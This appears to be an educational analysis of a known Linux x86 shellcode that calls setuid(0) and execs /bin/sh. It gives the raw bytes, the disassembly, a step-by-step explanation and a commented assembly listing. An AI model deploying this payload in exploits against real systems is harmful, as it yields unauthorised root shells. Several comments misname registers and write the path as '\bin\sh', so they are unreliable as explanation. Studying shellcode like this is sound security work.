## Shellcode analysis case 1

----

#### Shellcode - Spawns a root shell on Linux : [source](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html) 
```
\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80

```
```
Dissassembly-
0:  31 c0                   xor    eax,eax
2:  89 c3                   mov    ebx,eax
4:  b0 17                   mov    al,0x17
6:  cd 80                   int    0x80
8:  31 d2                   xor    edx,edx
a:  52                      push   edx
b:  68 6e 2f 73 68          push   0x68732f6e
10: 68 2f 2f 62 69          push   0x69622f2f
15: 89 e3                   mov    ebx,esp
17: 52                      push   edx
18: 53                      push   ebx
19: 89 e1                   mov    ecx,esp
1b: 8d 42 0b                lea    eax,[edx+0xb]
1e: cd 80                   int    0x80 
```
Executing the setuid syscall
```assembly
xor    eax,eax ; zero's out the eax register
mov    ebx,eax ; clears ebx register
mov    al,0x17 ; SysCall 0x17 (sys_setuid16)
int    0x80    ; Executes syscall
```
Spawning a /bin/sh shell breakdown-

Pushes the text "\bin\sh" onto the stack which spawns the sh shell
```assembly
xor    edx,edx ; zero out edx
push   edx     ; pushes edx to the stack
; spawning the shell
push   0x68732f6e ; little endian hex code "n\sh"
push   0x69622f2f ; little endian hex code "\\bi"
mov    ebx,esp    ; puts the address of /bin/sh into edx from esp
```
Since using PUSH puts something on top of the stack, it ESP is pointing to it
we can utilize this and load the address of /bin/sh into ebx since its being pushed into ESP
```assembly
push   edx  ; pushing ebx to the stack
push   ebx  ; puts ebx on the stack
mov    ecx,esp  ; loading esp register into ecx
lea    eax,[edx+0xb] ;stores edx register + 11
int    0x80  ; interupt, starts it
```


## Commented /bin/sh Assembly shellcode
```assembly
global _start
section .data
_start:
        xor    eax,eax       ; zero's out the eax register
        mov    ebx,eax       ; clears ebx register
        mov    al,0x17       ; SysCall 0x17 (sys_setuid16)
        int    0x80          ; Executes syscall
        xor    edx,edx       ; zero out edx
        push   edx           ; pushes 0 to the stack
        push   0x68732f6e    ; little endian hex code "n\sh"
        push   0x69622f2f    ; little endian hex code "\\bi"
        mov    ebx,esp       ; ges /bin/sh address
        push   edx           ; pushing ebx to the stack
        push   ebx           ; puts ebx on the stack
        mov    ecx,esp       ; loading esp register into ecx
        lea    eax,[edx+0xb] ; stores edx register + 11
        int    0x80          ; interupt, starts it all
